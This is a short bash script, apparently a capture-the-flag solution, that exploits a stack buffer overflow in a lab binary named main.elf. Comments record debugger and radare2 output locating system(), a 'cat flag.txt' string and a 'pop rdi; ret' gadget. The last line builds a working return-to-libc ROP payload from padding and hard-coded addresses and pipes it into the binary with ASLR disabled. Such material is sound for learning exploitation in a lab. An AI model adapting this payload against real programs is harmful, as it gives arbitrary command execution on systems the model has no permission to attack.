#!/bin/bash

# gdb-peda$ p system
# $5 = {<text variable, no debug info>} 0x7ffff7a52390 <__libc_system>

#find 'cat'
#Searching for 'cat' in: None ranges
#Found 83 results, display max 83 items:
  #main.elf : 0x40078c ("cat flag.txt")
  #main.elf : 0x60078c ("cat flag.txt")

# $r2 main.elf 
#  >  /R pop rdi
#  0x00400713                 5f  pop rdi
#  0x00400714                 c3  ret


#offset =  128B,  8 'B's to overwrite rbp, then the address of pop rdi; ret gadget, then the argument 'cat flag.txt' for system which is poped in rdi, and the address of system from libc

python -c 'print("A"*128 + "BBBBBBBB" + "\x13\x07\x40\x00\x00\x00\x00\x00" + "\x8c\x07\x40\x00\x00\x00\x00\x00" + "\x90\x23\xa5\xf7\xff\x7f\x00\x00")' | ./run_noaslr.sh 


